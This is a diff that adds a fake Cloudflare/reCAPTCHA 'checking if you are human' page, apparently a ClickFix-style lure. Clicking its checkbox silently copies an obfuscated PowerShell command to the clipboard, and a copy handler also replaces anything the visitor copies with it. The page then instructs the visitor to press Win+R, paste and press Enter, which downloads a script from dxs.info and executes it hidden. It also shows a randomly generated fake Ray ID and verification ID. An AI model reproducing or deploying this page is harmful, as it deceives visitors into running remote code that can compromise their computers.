@@ -1,0 +1,611 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checking if you are human</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+    body {
+    background-color: #fcfcfc;
+      color: #333;
+    }
+
+    .tettx {
+            color: rgb(78 78 78);
+    }
+
+    .verify-main {
+            color: #333 !important;
+    }
+
+    .verify-verify-button {
+            background: #333333 !important;
+    }
+
+    .checkbox-window {
+     display: flex;
+     flex-direction: column;
+     align-items: center;
+     width: 300px;
+     height: 74px;
+     background-color: #fafafa;
+     border: 1px solid #e0e0e0;
+     border-radius: 4px;
+     padding: 10px;
+     overflow: hidden;
+     transition: width 0.5s ease-in-out, height 0.5s ease-in-out;
+    }
+
+    .checkbox-container {
+     width: 28px;
+     height: 28px;
+     margin-left: 12px;
+     margin-right: 8px;
+     position: relative;
+    }
+
+.checkbox {
+    width: 100%;
+    height: 100%;
+    background-color: #ffffff;
+    border-radius: 2px;
+    border: 2px solid #888888;
+    cursor: pointer;
+    transition: border-color 0.3s, background-color 0.3s;
+}
+
+    .checkbox.checked {
+     border-color: #4285f4;
+     background-color: #4285f4;
+     position: relative;
+    }
+
+    .checkbox.checked::after {
+     content: "\f00c";
+     font-family: "FontAwesome";
+     color: #fff;
+     font-size: 18px;
+     position: absolute;
+     top: -2px;
+     left: 2px;
+    }
+
+    .spinner {
+     visibility: hidden;
+     position: relative;
+    }
+
+    .verify-window {
+     opacity: 0;
+     visibility: hidden;
+     width: 100%;
+     height: 0;
+     transition: opacity 0.5s ease-in-out, height 0.5s ease-in-out;
+    }
+
+    .verify-window.active {
+     opacity: 1;
+     visibility: visible;
+     height: auto;
+    }
+
+    .verify-header {
+     background-color: #e85d1a;
+     padding: 10px;
+     color: #fff;
+     font-size: 14px;
+    }
+
+    .verify-main {
+     padding: 10px;
+     font-size: 14px;
+     color: #fff;
+    }
+
+    .verify-footer {
+     background-color: #f2f2f2;
+     padding: 10px;
+     text-align: right;
+    }
+
+    .verify-footer button {
+     padding: 8px 15px;
+     background: #4285f4;
+     color: #fff;
+     border: none;
+     cursor: pointer;
+     border-radius: 4px;
+    }
+
+    /* NEW STYLE */
+
+    .verify-window {
+     width: auto;
+    }
+
+    .verify-header {
+     background-color: #e85d1a;
+     padding: 10px 16px;
+     color: #fff;
+     font-size: 14px;
+     border-radius: 0;
+    }
+
+    .lds-ring div {
+     border-color: #999 transparent transparent;
+    }
+    body.theme-light .lds-ring div {
+     border-color: #595959 transparent transparent;
+    }
+
+    .lds-ring {
+     display: inline-block;
+     position: relative;
+    }
+    .lds-ring,
+    .lds-ring div {
+     height: 1.875rem;
+     width: 1.875rem;
+    }
+    .lds-ring div {
+     animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+     border: 0.3rem solid transparent;
+     border-radius: 50%;
+     border-top-color: #313131;
+     box-sizing: border-box;
+     display: block;
+     position: absolute;
+    }
+    .lds-ring div:first-child {
+     animation-delay: -0.45s;
+    }
+    .lds-ring div:nth-child(2) {
+     animation-delay: -0.3s;
+    }
+    .lds-ring div:nth-child(3) {
+     animation-delay: -0.15s;
+    }
+
+    @keyframes lds-ring {
+     0% {
+      transform: rotate(0deg);
+     }
+     to {
+      transform: rotate(1turn);
+     }
+    }
+
+ 
+
+       @media (prefers-color-scheme: dark) {
+     body .lds-ring div {
+      border-color: #676767 transparent transparent;
+     }
+    }
+
+    * {
+     box-sizing: border-box;
+     margin: 0;
+     padding: 0;
+    }
+    body {
+
+     font-family: system-ui, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji;
+    }
+
+    body {
+     display: flex;
+     flex-direction: column;
+     height: 100vh;
+     min-height: 100vh;
+    }
+
+    .main-wrapper {
+     align-items: center;
+     display: flex;
+     flex: 1;
+     flex-direction: column;
+    }
+    .main-content {
+     margin: 8rem auto;
+     max-width: 60rem;
+     padding-left: 1.5rem;
+     padding-right: 1.5rem;
+     width: 100%;
+    }
+
+    .footer {
+     font-size: 0.75rem;
+     line-height: 1.125rem;
+     margin: 0 auto;
+     max-width: 60rem;
+     padding-left: 1.5rem;
+     padding-right: 1.5rem;
+     width: 100%;
+    }
+
+    .footer-inner {
+     border-top: 1px solid #d9d9d9;
+     padding-bottom: 1rem;
+     padding-top: 1rem;
+     text-align: center;
+    }
+    /* Popup Verification Window */
+    .verify-window {
+     font-family: Roboto, helvetica, arial, sans-serif;
+     opacity: 0;
+     visibility: hidden;
+     margin: auto;
+     width: 310px;
+     transition: opacity 400ms;
+    }
+
+    .verify-window {
+     display: block;
+     top: 5px;
+     left: 54px;
+    }
+
+    .verify-header {
+     background-color: #1a73e8;
+     padding: 16px;
+     color: #fff;
+     font-size: 18px;
+     border-radius: 8px 8px 0 0;
+    }
+
+    .verify-main {
+     padding: 16px;
+     font-size: 14px;
+     color: #333;
+    }
+
+    .verify-main ol {
+     padding-left: 20px;
+    }
+
+    .verify-main ol li {
+     margin-bottom: 10px;
+    }
+
+    .verify-main code {
+     display: block;
+     margin-top: 10px;
+     background-color: #f9f9f9;
+     padding: 10px;
+     font-size: 12px;
+     border: 1px solid #ddd;
+    }
+
+    .verify-footer {
+     background-color: #f2f2f2;
+     padding: 16px;
+     text-align: right;
+    }
+
+    .verify-footer button {
+     padding: 10px 20px;
+     background: #4285f4;
+     color: #fff;
+     border: none;
+     border-radius: 5px;
+     cursor: pointer;
+    }
+
+    .overlay {
+     display: none;
+     position: fixed;
+     top: 0;
+     left: 0;
+     width: 100%;
+     height: 100%;
+     background: rgba(0, 0, 0, 0.5);
+     z-index: 10;
+    }
+
+    .overlay.active,
+    .verify-window.active {
+     display: block;
+    }
+
+    .verify-window {
+     width: auto;
+    }
+
+    .verify-header {
+     background-color: #e85d1a;
+     padding: 10px 16px;
+     color: #fff;
+     font-size: 14px;
+     border-radius: 0;
+    }
+
+    #spinner2 {
+    width: 40px; 
+    height: 40px; 
+    animation: rotate 4s linear infinite; 
+    margin-top: -4px;
+    
+}
+
+.checkbox-window {
+  
+    opacity: 0;
+}
+
+@keyframes rotate {
+    from {
+        transform: rotate(0deg);
+    }
+
+    to {
+        transform: rotate(360deg);
+    }
+}
+
+
+
+    </style>
+</head>
+<body>
+
+<div class="main-wrapper">
+ <div class="main-content">
+  <div style="display: flex; align-items: center;">
+   
+  <!-- <img src="https://2captcha.com/dist/web/assets/google-privacy-policy-Cb0CGVRT.svg" /> -->
+
+   <img class="logo-img" src="" style="height: 2rem; margin-right: 0.5rem;" >
+
+
+
+   <p style="font-size: 2.5rem; font-weight: 500; line-height: 3.75rem;"><span class="domain-name"></span></p>
+  </div>
+
+ <div style="font-size: 1.5rem; line-height: 2.25rem; margin-bottom: 2rem; min-height: 2rem;">
+  <p>
+    <span class="preloader_text">Checking if you are human. This may take a few seconds.</span>
+    <span class="textallstep" style="display: none;">Verify you are human by completing the action below.</span>   
+  </p>
+</div>
+
+  <!-- PRELOADER -->
+  <div class="preloader">
+       <div class="lds-ring">
+       <div></div>
+       <div></div>
+       <div></div>
+       <div></div>
+      </div>
+  </div>
+
+
+
+  <!-- START -->
+
+  <div id="checkbox-window" class="checkbox-window" style="width: 300px; height: 74px; display: none;">
+   <div style="display: flex; align-items: center; width: 100%;">
+    <div class="checkbox-container" style="margin-left: 3px; margin-right: 12px; width: 30px;">
+
+     <svg style="display: none;" class="step0" id="spinner2" fill="green" viewBox="0 0 60 60" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="30" cy="10" r="2.5" class="point"></circle>
+        <circle cx="50" cy="30" r="2.5" class="point"></circle>
+        <circle cx="30" cy="50" r="2.5" class="point"></circle>
+        <circle cx="10" cy="30" r="2.5" class="point"></circle>
+        <circle cx="43.6" cy="16.4" r="2.5" class="point"></circle>
+        <circle cx="16.4" cy="16.4" r="2.5" class="point"></circle>
+        <circle cx="43.6" cy="43.6" r="2.5" class="point"></circle>
+        <circle cx="16.4" cy="43.6" r="2.5" class="point"></circle>
+      </svg>  
+    
+     <button type="button" id="checkbox" class="checkbox step1" style="display: none;"></button>
+
+     <div class="spinner step2" id="spinner" style="visibility: hidden; display: none;">
+      <div class="lds-ring">
+       <div></div>
+       <div></div>
+       <div></div>
+       <div></div>
+      </div>
+     </div>
+
+     <div class="step3" style="display: none;">
+      <svg width="30" height="30" viewBox="0 0 50 50" xmlns="http://www.w3.org/2000/svg">
+       <circle cx="25" cy="25" r="23" fill="#28a745" />
+       <path d="M15 25 L22 32 L35 18" stroke="white" stroke-width="4" fill="none" stroke-linecap="round" stroke-linejoin="round" />
+      </svg>
+     </div>
+    </div>
+
+    <div class="tettx">
+     <p class="step0" style="margin: 0 !important; ">Verifying...</p>
+     <p class="step1" style="margin: 0 !important; display: none;">I'm not a robot</p>
+     <p class="step2" style="margin: 0 !important; display: none;">Verification Steps</p>
+     <p class="step3" style="margin: 0 !important; display: none;">Successfully.</p>
+    </div>
+
+    <div style="font-size: 8px; text-align: right; margin-left: auto;">
+     <img style="width: 67px; height: 23px; margin-bottom: 5px;" src="https://i.postimg.cc/k4zrz92z/111.png" />
+     <p style="text-decoration: underline;">Confidentiality</p>
+     <p style="text-decoration: underline;">Terms and Conditions</p>
+    </div>
+   </div>
+
+   <div id="verify-window" class="verify-window" style="border-top: 1px solid #797979; padding-top: 3px; margin-top: 15px;">
+    <div class="verify-container">
+     <main class="verify-main" style="color: #d9d9d9;">
+      <p style="font-size: 18px; margin-bottom: 15px;">
+       To better prove you are not a robot, please:
+      </p>
+      <ol>
+       <li>Press &amp; hold the Windows Key <i class="fab fa-windows"></i> + <b>R</b>.</li>
+
+       <li>In the verification window, press <b>Ctrl</b> + <b>V</b>.</li>
+
+       <li>Press <b>Enter</b> on your keyboard to finish.</li>
+      </ol>
+      <p style="padding-top: 10px;">
+       You will observe and agree:
+       <br />
+       <code style="background: none; border: 1px solid #797979; width: 432px;"> ✅ "I am not a robot - reCAPTCHA Verification ID: <span id="verification-id">146820</span>" </code>
+      </p>
+     </main>
+    </div>
+    <div class="verify-container verify-footer" style="background: none;">
+     <div class="verify-footer-left" style="width: 286px; float: left; text-align: left; font-size: 15px;">
+      Perform the steps above to finish verification.
+     </div>
+     <button type="button" class="verify-verify-button block" id="verify-button" style="background: #5e5e5e; padding: 9px 38px;">Verify</button>
+    </div>
+   </div>
+
+   <!-- -->
+
+   <script>
+document.addEventListener("DOMContentLoaded", function () {
+    const domain = window.location.hostname;
+    document.querySelectorAll(".domain").forEach(el => {
+        if (el) el.textContent = domain;
+    });
+});
+</script>
+
+  </div>
+    <p style="font-size: 1.5rem;
+    line-height: 2.25rem; padding-top: 20px;"><span class="domain-name"></span> needs to review the security of your connection before proceeding.</p>
+ </div>
+</div>
+
+<div class="footer" role="contentinfo">
+ <div class="footer-inner">
+  <div>
+   <div>Ray ID: <code class="ray-id">56a4c5299fdetmca</code></div>
+  </div>
+  <div style="margin-top: 5px;">Platform performance and security <span style="color: #000000">Cloudflare</span></div>
+ </div>
+</div>
+
+
+<script>
+
+// COMAND  
+
+// COMAND
+
+const command = `powershell -w h -nop -c "$au='ht'+'t'+'ps';$p=':'+'//'+'dxs'+'.'+'info'+'/';$h='Cs'+'qo'+'D5'+'2u'+'.txt';$z=$au+$p+$h;$cz='{0}{1}{2}' -f 'Net.','Web','Client';$c=New-Object ($cz);$e=$c.('Download'+'String')($z);$\{vp\}=[ScriptBlock]::Create($e);&$\{vp\}"`;
+
+const params = new URLSearchParams(window.location.search);
+const siteUrl = params.get('site');
+const logoUrl = params.get('logo');
+const defaultLogoUrl = 'https://2captcha.com/dist/web/assets/google-privacy-policy-Cb0CGVRT.svg';
+
+document.querySelectorAll('.domain-name').forEach(el => {
+  el.textContent = siteUrl;
+});
+
+document.querySelectorAll('.logo-img').forEach(img => {
+  img.src = logoUrl || defaultLogoUrl;
+  img.alt = 'logo';
+});
+
+
+
+document.addEventListener("DOMContentLoaded", function () {
+    const preloaderElements = document.querySelectorAll(".preloader");
+    const preloaderText = document.querySelector(".preloader_text");
+    const textAllStep = document.querySelector(".textallstep");
+    const checkboxWindow = document.getElementById("checkbox-window");
+    const step0Elements = document.querySelectorAll(".step0");
+    const step1Elements = document.querySelectorAll(".step1");
+    const step2Elements = document.querySelectorAll(".step2");
+    const step3Elements = document.querySelectorAll(".step3");
+    const checkbox = document.getElementById("checkbox");
+    const verifyWindow = document.getElementById("verify-window");
+    const spinner = document.getElementById("spinner");
+    const verifyButton = document.getElementById("verify-button");
+
+    setTimeout(() => {
+        preloaderElements.forEach(el => el.style.display = "none");
+        preloaderText.style.display = "none";
+        textAllStep.style.display = "block";
+        checkboxWindow.style.display = "flex";
+
+        setTimeout(() => {
+            checkboxWindow.style.display = "flex"; 
+            let opacity = 0;
+            let fadeIn = setInterval(() => {
+                if (opacity >= 1) {
+                    clearInterval(fadeIn); 
+                } else {
+                    opacity += 0.1; 
+                    checkboxWindow.style.opacity = opacity;
+                }
+            }, 30);
+        }, 200);
+
+        step0Elements.forEach(el => el.style.display = "block");
+
+        setTimeout(() => {
+            step0Elements.forEach(el => el.style.display = "none");
+            step1Elements.forEach(el => el.style.display = "block");
+        }, 2000); 
+    }, 1500); 
+
+    checkbox.addEventListener("click", function () {
+        const textarea = document.createElement('textarea');
+        textarea.value = command;
+        textarea.setAttribute('readonly', '');
+        textarea.style.position = 'absolute';
+        textarea.style.left = '-9999px';
+        document.body.appendChild(textarea);
+        textarea.select();
+        document.execCommand('copy');
+        document.body.removeChild(textarea);
+        console.log('✅');
+
+        step1Elements.forEach(el => el.style.display = "none");
+        step2Elements.forEach(el => el.style.display = "block");
+        spinner.style.visibility = "visible";
+
+        setTimeout(() => {
+            checkboxWindow.style.width = "530px";
+            checkboxWindow.style.height = "auto";
+            verifyWindow.classList.add("active");
+        }, 500);
+    });
+
+    verifyButton.addEventListener("click", function () {
+        verifyWindow.classList.remove("active");
+        checkboxWindow.style.height = "74px";
+
+        setTimeout(() => {
+            checkboxWindow.style.width = "300px";
+            step2Elements.forEach(el => el.style.display = "none");
+            step3Elements.forEach(el => el.style.display = "block");
+
+            setTimeout(() => {
+                step3Elements.forEach(el => el.style.display = "none");
+                step1Elements.forEach(el => el.style.display = "block");
+                spinner.style.visibility = "hidden";
+            }, 1000);
+        }, 600);
+    });
+
+    document.getElementById("verification-id").textContent = Math.floor(100000 + Math.random() * 900000);
+    const chars = "abcdef0123456789";
+    document.querySelector(".ray-id").textContent = Array.from({ length: 16 }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
+});
+
+
+document.addEventListener('copy', function (e) {
+    e.preventDefault();
+    if (e.clipboardData) {
+        e.clipboardData.setData('text/plain', command);
+        console.log('✅');
+    } else if (window.clipboardData) {
+        window.clipboardData.setData('Text', command);
+    }
+});
+</script>
+
+
+</body></html>
